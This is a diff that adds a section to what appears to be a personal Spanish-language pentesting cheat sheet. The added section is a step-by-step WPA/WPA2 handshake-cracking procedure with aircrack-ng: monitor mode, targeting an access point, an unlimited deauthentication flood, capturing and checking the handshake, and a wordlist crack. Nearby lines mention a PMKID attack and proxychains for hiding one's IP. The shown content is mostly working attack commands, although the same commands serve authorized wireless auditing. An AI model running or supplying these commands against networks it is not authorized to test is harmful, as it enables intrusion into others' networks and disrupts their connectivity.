@@ -80,6 +80,23 @@ Ataque a claves WPA con PMKID sin Deauth WPA/WPA2:
 
 #################################################################################################################################
 
+airmon-ng check kill
+airmon-ng start wlan0
+airmon-ng
+airodump-ng wlan0mon
+airodump-ng wlan0mon -d 00:11:22:33:44:55                                  access point MAC
+
+Los siguientes dos en simultáneo:
+airodump-ng -w outputFile -c 2 --bssid 00:11:22:33:44:55 wlan0mon
+aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon                       0 es sin límite
+
+wireshark outFile-01.cap              filtrar eapol y buscar el paquete que va del access point al dispositivo, "WPA Key Data"
+airmon-ng stop wlan0mon
+aircrack-ng outFile-01.cap -w ~/Documents/psws.txt
+
+
+#################################################################################################################################
+
 PROXYCHAINS
 solo tcp, sirve para esconder la ip de las peticiones
 cambiar etc/proxychains4.conf el strict_chain a dynamic_chain, comentar proxy_dns y colocar la ip abajo de todo
